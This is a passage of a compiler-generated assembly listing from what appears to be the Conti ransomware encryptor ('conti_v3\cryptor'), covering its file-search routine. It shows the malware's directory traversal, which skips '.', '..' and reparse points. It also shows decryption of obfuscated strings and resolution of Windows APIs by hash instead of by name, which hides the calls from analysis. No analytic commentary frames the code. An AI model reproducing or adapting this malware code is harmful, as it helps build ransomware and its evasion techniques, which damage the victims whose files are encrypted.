  00466	49 8b 56 18	 mov	 rdx, QWORD PTR [r14+24]
  0046a	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  0046e	76 35		 jbe	 SHORT $LN1212@SearchFile
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00470	49 8b 0e	 mov	 rcx, QWORD PTR [r14]
  00473	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0047b	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00482	72 1c		 jb	 SHORT $LN1211@SearchFile

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00484	48 8b 79 f8	 mov	 rdi, QWORD PTR [rcx-8]
  00488	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0048c	48 2b cf	 sub	 rcx, rdi

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0048f	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00493	48 83 f8 1f	 cmp	 rax, 31
  00497	0f 87 7b 09 00
	00		 ja	 $LN158@SearchFile

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0049d	48 8b cf	 mov	 rcx, rdi
$LN1211@SearchFile:

; 268  :         ::operator delete(_Ptr, _Bytes);

  004a0	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN1212@SearchFile:
  004a5	ba 30 00 00 00	 mov	 edx, 48			; 00000030H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  004aa	49 89 76 10	 mov	 QWORD PTR [r14+16], rsi
  004ae	49 8b ce	 mov	 rcx, r14

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  004b1	49 c7 46 18 07
	00 00 00	 mov	 QWORD PTR [r14+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  004b9	66 41 89 36	 mov	 WORD PTR [r14], si
  004bd	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN1826@SearchFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 173  : 	while (!TAILQ_EMPTY(&DirectoryList)) {

  004c2	48 8b 95 68 03
	00 00		 mov	 rdx, QWORD PTR SearchMask$76[rbp-232]
  004c9	48 83 fa 07	 cmp	 rdx, 7
  004cd	76 39		 jbe	 SHORT $LN440@SearchFile
  004cf	48 8b 8d 50 03
	00 00		 mov	 rcx, QWORD PTR SearchMask$76[rbp-256]
  004d6	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  004de	48 8b c1	 mov	 rax, rcx
  004e1	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  004e8	72 19		 jb	 SHORT $LN439@SearchFile
  004ea	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  004ee	48 83 c2 27	 add	 rdx, 39			; 00000027H
  004f2	48 2b c1	 sub	 rax, rcx
  004f5	48 83 c0 f8	 add	 rax, -8
  004f9	48 83 f8 1f	 cmp	 rax, 31
  004fd	0f 87 15 09 00
	00		 ja	 $LN158@SearchFile
$LN439@SearchFile:
  00503	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN440@SearchFile:
  00508	48 8b 95 48 03
	00 00		 mov	 rdx, QWORD PTR CurrentDirectory$75[rbp-232]
  0050f	66 89 b5 50 03
	00 00		 mov	 WORD PTR SearchMask$76[rbp-256], si
  00516	48 c7 85 68 03
	00 00 07 00 00
	00		 mov	 QWORD PTR SearchMask$76[rbp-232], 7
  00521	48 89 b5 60 03
	00 00		 mov	 QWORD PTR SearchMask$76[rbp-240], rsi
  00528	48 83 fa 07	 cmp	 rdx, 7
  0052c	0f 86 be fb ff
	ff		 jbe	 $LL8@SearchFile
  00532	48 8b 8d 30 03
	00 00		 mov	 rcx, QWORD PTR CurrentDirectory$75[rbp-256]
  00539	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  00541	48 8b c1	 mov	 rax, rcx
  00544	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  0054b	72 19		 jb	 SHORT $LN468@SearchFile
  0054d	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  00551	48 83 c2 27	 add	 rdx, 39			; 00000027H
  00555	48 2b c1	 sub	 rax, rcx
  00558	48 83 c0 f8	 add	 rax, -8
  0055c	48 83 f8 1f	 cmp	 rax, 31
  00560	0f 87 b2 08 00
	00		 ja	 $LN158@SearchFile
$LN468@SearchFile:
  00566	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
  0056b	e9 80 fb ff ff	 jmp	 $LL8@SearchFile
$LL15@SearchFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00570	c6 44 24 20 00	 mov	 BYTE PTR $T16[rsp], 0
  00575	c6 44 24 21 40	 mov	 BYTE PTR $T16[rsp+1], 64 ; 00000040H
  0057a	c6 44 24 22 23	 mov	 BYTE PTR $T16[rsp+2], 35 ; 00000023H
  0057f	c6 44 24 23 23	 mov	 BYTE PTR $T16[rsp+3], 35 ; 00000023H
  00584	c6 44 24 24 23	 mov	 BYTE PTR $T16[rsp+4], 35 ; 00000023H
  00589	0f b6 44 24 21	 movzx	 eax, BYTE PTR $T16[rsp+1]

; 58   :         return m_isDecrypted;

  0058e	0f b6 44 24 20	 movzx	 eax, BYTE PTR $T16[rsp]

; 63   :         if (!isDecrypted())

  00593	84 c0		 test	 al, al
  00595	75 54		 jne	 SHORT $LN57@SearchFile

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00597	48 8b fe	 mov	 rdi, rsi
  0059a	66 0f 1f 44 00
	00		 npad	 6
$LL58@SearchFile:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005a0	0f b6 4c 3c 21	 movzx	 ecx, BYTE PTR $T16[rsp+rdi+1]

; 40   :     return (a % n + n) % n;

  005a5	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  005aa	83 e9 23	 sub	 ecx, 35			; 00000023H
  005ad	6b c9 29	 imul	 ecx, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  005b0	f7 e9		 imul	 ecx
  005b2	03 d1		 add	 edx, ecx
  005b4	c1 fa 06	 sar	 edx, 6
  005b7	8b c2		 mov	 eax, edx
  005b9	c1 e8 1f	 shr	 eax, 31
  005bc	03 d0		 add	 edx, eax
  005be	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005c1	2b c8		 sub	 ecx, eax
  005c3	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  005c8	83 c1 7f	 add	 ecx, 127		; 0000007fH
  005cb	f7 e9		 imul	 ecx
  005cd	03 d1		 add	 edx, ecx
  005cf	c1 fa 06	 sar	 edx, 6
  005d2	8b c2		 mov	 eax, edx
  005d4	c1 e8 1f	 shr	 eax, 31
  005d7	03 d0		 add	 edx, eax
  005d9	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005dc	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005de	88 4c 3c 21	 mov	 BYTE PTR $T16[rsp+rdi+1], cl
  005e2	48 ff c7	 inc	 rdi
  005e5	48 83 ff 04	 cmp	 rdi, 4
  005e9	72 b5		 jb	 SHORT $LL58@SearchFile
$LN57@SearchFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 553  : 	pFunction = (int(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd76d434b, 60);//GetProcAddress(hKernel32, OBFA("lstrcmpW"));

  005eb	ba 0f 00 00 00	 mov	 edx, 15
  005f0	41 b8 4b 43 6d
	d7		 mov	 r8d, -680705205		; d76d434bH
  005f6	44 8d 4a 2d	 lea	 r9d, QWORD PTR [rdx+45]
  005fa	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 554  : 	return pFunction(lpString1, lpString2);

  005ff	48 8d 54 24 21	 lea	 rdx, QWORD PTR $T16[rsp+1]
  00604	48 8d 8d ec 03
	00 00		 lea	 rcx, QWORD PTR FindData$81[rbp-212]
  0060b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 199  : 				!plstrcmpW(FindData.cFileName, OBFW(L"..")) ||

  0060d	85 c0		 test	 eax, eax
  0060f	0f 84 c9 06 00
	00		 je	 $LN13@SearchFile
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00615	c6 44 24 28 00	 mov	 BYTE PTR $T17[rsp], 0
  0061a	c6 44 24 29 2e	 mov	 BYTE PTR $T17[rsp+1], 46 ; 0000002eH
  0061f	c6 44 24 2a 64	 mov	 BYTE PTR $T17[rsp+2], 100 ; 00000064H
  00624	c6 44 24 2b 2e	 mov	 BYTE PTR $T17[rsp+3], 46 ; 0000002eH
  00629	c6 44 24 2c 64	 mov	 BYTE PTR $T17[rsp+4], 100 ; 00000064H
  0062e	c6 44 24 2d 64	 mov	 BYTE PTR $T17[rsp+5], 100 ; 00000064H
  00633	c6 44 24 2e 64	 mov	 BYTE PTR $T17[rsp+6], 100 ; 00000064H
  00638	0f b6 44 24 29	 movzx	 eax, BYTE PTR $T17[rsp+1]

; 58   :         return m_isDecrypted;

  0063d	0f b6 44 24 28	 movzx	 eax, BYTE PTR $T17[rsp]

; 63   :         if (!isDecrypted())

  00642	84 c0		 test	 al, al
  00644	75 59		 jne	 SHORT $LN87@SearchFile

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00646	48 8b fe	 mov	 rdi, rsi
  00649	0f 1f 80 00 00
	00 00		 npad	 7
$LL88@SearchFile:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00650	0f b6 4c 3c 29	 movzx	 ecx, BYTE PTR $T17[rsp+rdi+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00655	b8 64 00 00 00	 mov	 eax, 100		; 00000064H
  0065a	2b c1		 sub	 eax, ecx
  0065c	6b c8 3e	 imul	 ecx, eax, 62		; 0000003eH

; 40   :     return (a % n + n) % n;

  0065f	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00664	f7 e9		 imul	 ecx
  00666	03 d1		 add	 edx, ecx
  00668	c1 fa 06	 sar	 edx, 6
  0066b	8b c2		 mov	 eax, edx
  0066d	c1 e8 1f	 shr	 eax, 31
  00670	03 d0		 add	 edx, eax
  00672	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00675	2b c8		 sub	 ecx, eax
  00677	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0067c	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0067f	f7 e9		 imul	 ecx
  00681	03 d1		 add	 edx, ecx
  00683	c1 fa 06	 sar	 edx, 6
  00686	8b c2		 mov	 eax, edx
  00688	c1 e8 1f	 shr	 eax, 31
  0068b	03 d0		 add	 edx, eax
  0068d	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00690	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00692	88 4c 3c 29	 mov	 BYTE PTR $T17[rsp+rdi+1], cl
  00696	48 ff c7	 inc	 rdi
  00699	48 83 ff 06	 cmp	 rdi, 6
  0069d	72 b1		 jb	 SHORT $LL88@SearchFile
$LN87@SearchFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 553  : 	pFunction = (int(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd76d434b, 60);//GetProcAddress(hKernel32, OBFA("lstrcmpW"));

  0069f	ba 0f 00 00 00	 mov	 edx, 15
  006a4	41 b8 4b 43 6d
	d7		 mov	 r8d, -680705205		; d76d434bH
  006aa	44 8d 4a 2d	 lea	 r9d, QWORD PTR [rdx+45]
  006ae	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 554  : 	return pFunction(lpString1, lpString2);

  006b3	48 8d 54 24 29	 lea	 rdx, QWORD PTR $T17[rsp+1]
  006b8	48 8d 8d ec 03
	00 00		 lea	 rcx, QWORD PTR FindData$81[rbp-212]
  006bf	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 199  : 				!plstrcmpW(FindData.cFileName, OBFW(L"..")) ||

  006c1	85 c0		 test	 eax, eax
  006c3	0f 84 15 06 00
	00		 je	 $LN13@SearchFile
  006c9	8b 85 c0 03 00
	00		 mov	 eax, DWORD PTR FindData$81[rbp-256]
  006cf	0f ba e0 0a	 bt	 eax, 10
  006d3	0f 82 05 06 00
	00		 jb	 $LN13@SearchFile

; 200  : 				FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
; 201  : 			{
; 202  : 				continue;
; 203  : 			}
; 204  : 
; 205  : 			if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&

  006d9	a8 10		 test	 al, 16
  006db	0f 84 1a 03 00
	00		 je	 $LN29@SearchFile
  006e1	48 8d 8d ec 03
	00 00		 lea	 rcx, QWORD PTR FindData$81[rbp-212]
  006e8	e8 00 00 00 00	 call	 ?CheckDirectory@@YAHPEB_W@Z ; CheckDirectory
  006ed	85 c0		 test	 eax, eax
  006ef	0f 84 06 03 00
	00		 je	 $LN29@SearchFile
  006f5	0f 57 c0	 xorps	 xmm0, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  006f8	48 8d 85 ec 03
	00 00		 lea	 rax, QWORD PTR FindData$81[rbp-212]

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  006ff	0f 11 45 b0	 movups	 XMMWORD PTR $T18[rbp-256], xmm0

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  00703	48 c7 c7 ff ff
	ff ff		 mov	 rdi, -1
  0070a	66 0f 1f 44 00
	00		 npad	 6
$LL1726@SearchFile:
  00710	48 ff c7	 inc	 rdi
  00713	66 83 3c 78 00	 cmp	 WORD PTR [rax+rdi*2], 0
  00718	75 f6		 jne	 SHORT $LL1726@SearchFile

; 2669 :         if (_Count > max_size()) {

  0071a	48 bb fe ff ff
	ff ff ff ff 7f	 mov	 rbx, 9223372036854775806 ; 7ffffffffffffffeH
  00724	48 3b fb	 cmp	 rdi, rbx
  00727	0f 87 fd 06 00
	00		 ja	 $LN1672@SearchFile

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();
; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  0072d	48 83 ff 07	 cmp	 rdi, 7
  00731	77 2c		 ja	 SHORT $LN1477@SearchFile

; 2678 :             _My_data._Mysize = _Count;

  00733	48 89 7d c0	 mov	 QWORD PTR $T18[rbp-240], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00737	48 8d 95 ec 03
	00 00		 lea	 rdx, QWORD PTR FindData$81[rbp-212]
  0073e	48 03 ff	 add	 rdi, rdi

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00741	48 c7 45 c8 07
	00 00 00	 mov	 QWORD PTR $T18[rbp-232], 7

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00749	4c 8b c7	 mov	 r8, rdi
  0074c	48 8d 4d b0	 lea	 rcx, QWORD PTR $T18[rbp-256]
  00750	e8 00 00 00 00	 call	 memcpy

; 2686 :                 _Traits::assign(_My_data._Bx._Buf[_Count], _Elem());

  00755	66 89 74 3d b0	 mov	 WORD PTR $T18[rbp+rdi-256], si

; 2687 :             } else { // _Strat == _Construct_strategy::_From_string
; 2688 : #ifdef _INSERT_STRING_ANNOTATION
; 2689 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _Count + 1);
; 2690 : #else // ^^^ _INSERT_STRING_ANNOTATION / !_INSERT_STRING_ANNOTATION vvv
; 2691 :                 _Traits::copy(_My_data._Bx._Buf, _Arg, _BUF_SIZE);
; 2692 : #endif // ^^^ !_INSERT_STRING_ANNOTATION ^^^
; 2693 :             }
; 2694 : 
; 2695 :             _Proxy._Release();
; 2696 :             return;

  0075a	e9 c5 00 00 00	 jmp	 $LN1475@SearchFile
$LN1477@SearchFile:

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  0075f	48 8b df	 mov	 rbx, rdi
  00762	48 b8 fe ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775806 ; 7ffffffffffffffeH
  0076c	48 83 cb 07	 or	 rbx, 7
  00770	48 89 9d b0 03
	00 00		 mov	 QWORD PTR _Masked$79[rbp-256], rbx
  00777	48 3b d8	 cmp	 rbx, rax

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  0077a	76 13		 jbe	 SHORT $LN1482@SearchFile

; 4763 :             return _Max;

  0077c	48 8b d8	 mov	 rbx, rax
  0077f	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00789	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  0078d	eb 33		 jmp	 SHORT $LN1716@SearchFile
$LN1482@SearchFile:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows
; 4767 :             return _Max;
; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  0078f	b8 0a 00 00 00	 mov	 eax, 10
  00794	48 3b d8	 cmp	 rbx, rax
  00797	48 89 45 40	 mov	 QWORD PTR $T25[rbp-256], rax
  0079b	48 0f 42 d8	 cmovb	 rbx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  0079f	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  007a9	48 8d 4b 01	 lea	 rcx, QWORD PTR [rbx+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  007ad	48 3b c8	 cmp	 rcx, rax
  007b0	0f 87 6e 06 00
	00		 ja	 $LN1674@SearchFile

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  007b6	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  007b9	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  007c0	72 2c		 jb	 SHORT $LN1498@SearchFile
$LN1716@SearchFile:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  007c2	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  007c6	48 3b c1	 cmp	 rax, rcx
  007c9	0f 86 55 06 00
	00		 jbe	 $LN1674@SearchFile

; 90   :         return ::operator new(_Bytes);

  007cf	48 8b c8	 mov	 rcx, rax
  007d2	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  007d7	48 85 c0	 test	 rax, rax
  007da	0f 84 38 06 00
	00		 je	 $LN158@SearchFile

; 149  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  007e0	48 8d 70 27	 lea	 rsi, QWORD PTR [rax+39]
  007e4	48 83 e6 e0	 and	 rsi, -32		; ffffffffffffffe0H

; 150  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  007e8	48 89 46 f8	 mov	 QWORD PTR [rsi-8], rax

; 242  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

  007ec	eb 0d		 jmp	 SHORT $LN1499@SearchFile
$LN1498@SearchFile:

; 243  :         }
; 244  :     }
; 245  : #endif // defined(_M_IX86) || defined(_M_X64)
; 246  : 
; 247  :     if (_Bytes != 0) {

  007ee	48 85 c9	 test	 rcx, rcx
  007f1	74 08		 je	 SHORT $LN1499@SearchFile

; 90   :         return ::operator new(_Bytes);

  007f3	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  007f8	48 8b f0	 mov	 rsi, rax
$LN1499@SearchFile:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2703 :         _My_data._Mysize = _Count;

  007fb	48 89 7d c0	 mov	 QWORD PTR $T18[rbp-240], rdi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  007ff	48 8d 95 ec 03
	00 00		 lea	 rdx, QWORD PTR FindData$81[rbp-212]
  00806	48 03 ff	 add	 rdi, rdi

; 2701 :         _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

  00809	48 89 75 b0	 mov	 QWORD PTR $T18[rbp-256], rsi

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0080d	4c 8b c7	 mov	 r8, rdi

; 2704 :         _My_data._Myres  = _New_capacity;

  00810	48 89 5d c8	 mov	 QWORD PTR $T18[rbp-232], rbx

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00814	48 8b ce	 mov	 rcx, rsi
  00817	e8 00 00 00 00	 call	 memcpy

; 2710 :             _Traits::assign(_Unfancy(_New_ptr)[_Count], _Elem());

  0081c	33 c0		 xor	 eax, eax
  0081e	66 89 04 37	 mov	 WORD PTR [rdi+rsi], ax
  00822	33 f6		 xor	 esi, esi
$LN1475@SearchFile:

; 2244 :         return _Myres > _Small_string_capacity;

  00824	48 83 bd 48 03
	00 00 07	 cmp	 QWORD PTR CurrentDirectory$75[rbp-232], 7

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  0082c	48 b8 fe ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775806 ; 7ffffffffffffffeH
  00836	48 8b 9d 40 03
	00 00		 mov	 rbx, QWORD PTR CurrentDirectory$75[rbp-240]

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  0083d	48 89 75 08	 mov	 QWORD PTR $T20[rbp-248], rsi

; 2235 :         const value_type* _Result = _Bx._Buf;

  00841	48 8d b5 30 03
	00 00		 lea	 rsi, QWORD PTR CurrentDirectory$75[rbp-256]

; 2236 :         if (_Large_mode_engaged()) {

  00848	48 0f 47 b5 30
	03 00 00	 cmova	 rsi, QWORD PTR CurrentDirectory$75[rbp-256]

; 2509 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00850	48 3b d8	 cmp	 rbx, rax

; 2669 :         if (_Count > max_size()) {

  00853	0f 87 d1 05 00
	00		 ja	 $LN1672@SearchFile

; 2671 :         }
; 2672 : 
; 2673 :         auto& _Al       = _Getal();
; 2674 :         auto&& _Alproxy = _GET_PROXY_ALLOCATOR(_Alty, _Al);
; 2675 :         _Container_proxy_ptr<_Alty> _Proxy(_Alproxy, _My_data);
; 2676 : 
; 2677 :         if (_Count <= _Small_string_capacity) {

  00859	48 83 fb 07	 cmp	 rbx, 7
  0085d	77 18		 ja	 SHORT $LN1538@SearchFile

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0085f	0f 10 06	 movups	 xmm0, XMMWORD PTR [rsi]

; 2678 :             _My_data._Mysize = _Count;

  00862	48 89 5d 10	 mov	 QWORD PTR $T20[rbp-240], rbx

; 2679 :             _My_data._Myres  = _Small_string_capacity;

  00866	48 c7 45 18 07
	00 00 00	 mov	 QWORD PTR $T20[rbp-232], 7

; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  0086e	0f 11 45 00	 movups	 XMMWORD PTR $T20[rbp-256], xmm0

; 2696 :             return;

  00872	e9 b5 00 00 00	 jmp	 $LN1536@SearchFile
$LN1538@SearchFile:

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00877	48 8b fb	 mov	 rdi, rbx
  0087a	48 83 cf 07	 or	 rdi, 7
  0087e	48 89 bd b8 03
	00 00		 mov	 QWORD PTR _Masked$80[rbp-256], rdi
  00885	48 3b f8	 cmp	 rdi, rax

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00888	76 13		 jbe	 SHORT $LN1543@SearchFile

; 4763 :             return _Max;

  0088a	48 8b f8	 mov	 rdi, rax
  0088d	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
  00897	48 8d 0c 00	 lea	 rcx, QWORD PTR [rax+rax]
  0089b	eb 33		 jmp	 SHORT $LN1715@SearchFile
$LN1543@SearchFile:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows
; 4767 :             return _Max;
; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  0089d	b8 0a 00 00 00	 mov	 eax, 10
  008a2	48 3b f8	 cmp	 rdi, rax
  008a5	48 89 45 48	 mov	 QWORD PTR $T34[rbp-256], rax
  008a9	48 0f 42 f8	 cmovb	 rdi, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  008ad	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2613 :         ++_Capacity; // Take null terminator into consideration

  008b7	48 8d 4f 01	 lea	 rcx, QWORD PTR [rdi+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 73   :         if (_Count > _Max_possible) {

  008bb	48 3b c8	 cmp	 rcx, rax
  008be	0f 87 60 05 00
	00		 ja	 $LN1674@SearchFile

; 74   :             _Throw_bad_array_new_length(); // multiply overflow
; 75   :         }
; 76   :     }
; 77   : 
; 78   :     return _Count * _Ty_size;

  008c4	48 03 c9	 add	 rcx, rcx

; 241  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  008c7	48 81 f9 00 10
	00 00		 cmp	 rcx, 4096		; 00001000H
  008ce	72 2f		 jb	 SHORT $LN1559@SearchFile
$LN1715@SearchFile:

; 142  :     const size_t _Block_size = _Non_user_size + _Bytes;

  008d0	48 8d 41 27	 lea	 rax, QWORD PTR [rcx+39]

; 143  :     if (_Block_size <= _Bytes) {

  008d4	48 3b c1	 cmp	 rax, rcx
  008d7	0f 86 47 05 00
	00		 jbe	 $LN1674@SearchFile

; 90   :         return ::operator new(_Bytes);

  008dd	48 8b c8	 mov	 rcx, rax
  008e0	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new
  008e5	48 8b c8	 mov	 rcx, rax

; 148  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  008e8	48 85 c0	 test	 rax, rax
  008eb	0f 84 27 05 00
	00		 je	 $LN158@SearchFile

